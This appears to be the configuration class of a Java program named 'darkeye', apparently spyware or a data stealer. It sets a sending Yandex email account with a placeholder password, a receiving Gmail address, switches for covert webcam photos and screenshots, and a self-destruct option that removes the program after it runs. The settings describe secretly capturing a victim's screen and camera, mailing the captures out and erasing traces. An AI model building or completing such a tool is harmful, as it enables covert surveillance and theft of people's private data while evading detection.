package org.spray.darkeye;

import org.spray.darkeye.objects.EMailData;
import org.spray.darkeye.objects.EMailData.EMailMethod;

public class Config {

	public static EMailData FROM_DATA = new EMailData("xxxxx@yandex.ru", "password", EMailMethod.YANDEX);
	public static EMailData TO_DATA = new EMailData("xxxxx@gmail.com");

	public static boolean WEBCAM_PHOTO = false;
	public static boolean SCREENSHOT = true;

	/**
	 * Self-destruct after work, no matter successful work or not
	 */
	public static boolean SELF_DESTRUCT = false;

}
